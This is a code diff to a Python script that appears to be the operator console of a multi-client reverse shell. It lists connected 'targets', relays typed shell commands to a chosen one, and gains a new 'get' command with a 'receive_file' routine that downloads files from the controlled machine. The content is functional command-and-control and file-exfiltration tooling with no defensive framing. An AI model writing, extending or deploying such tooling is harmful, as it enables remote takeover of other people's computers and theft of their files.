@@ -77,6 +77,49 @@ def logo():
 
 ################################################################################################
 ###############################################################################################
+def receive_file(client_socket, filename):
+    """Receives a file over the socket."""
+    try:
+        filesize_str = client_socket.recv(1024).decode()
+        filesize = int(filesize_str)
+
+        if filesize == -1:
+            print("File not found on server side.")
+            return
+
+        if filesize == -2:
+            print("An error occurred during file transfer on the server.")
+            return
+
+        with open("received_" + filename, "wb") as f: # Save with "received_" prefix
+            bytes_received = 0
+            while bytes_received < filesize:
+                chunk = client_socket.recv(4096)
+                if not chunk:
+                    break
+                f.write(chunk)
+                bytes_received += len(chunk)
+
+        print(f"File '{filename}' received successfully.")
+
+    except ValueError:
+        print("Invalid file size received.")
+    except Exception as e:
+        print(f"An error occurred during file reception: {e}")
+
+
+
+
+
+
+
+
+
+
+
+
+#############################################################################################
+#############################################################################################
 NUMBER_OF_THREATS = 2
 JOB_NUMBERS = [1,2]
 queue = Queue()
@@ -169,7 +212,7 @@ def list_connection():
             del all_address[i]
             continue
 
-        result = str(i) + " " + str(all_address[i][0] + " " + str(all_address[i][0]))
+        result = str(i) + " " + str(all_address[i][0] + " " + str(all_address[i][1]))
 
     print("-----Client-----\n" + result)
 
@@ -187,15 +230,20 @@ def select_target(cmd):
         return None
   
 def send_target_command(conn):
+    #tem_addr = all_address[all_connections.index(conn)]
         
     while True:
         try:
             cmd = input()
             if cmd == "quit":
                 break
-            if len(str.encode(cmd)) > 0:
+            elif cmd[:3] == "get":
                 conn.send(str.encode(cmd))
-                client_response = str(conn.recv(2048),"utf-8")
+                receive_file(conn,cmd[4:])
+
+            elif len(str.encode(cmd)) > 0:
+                conn.send(str.encode(cmd))
+                client_response =  str(conn.recv(2048),"utf-8")
                 print( client_response,end="")
         except:
             print("Error sending commands")
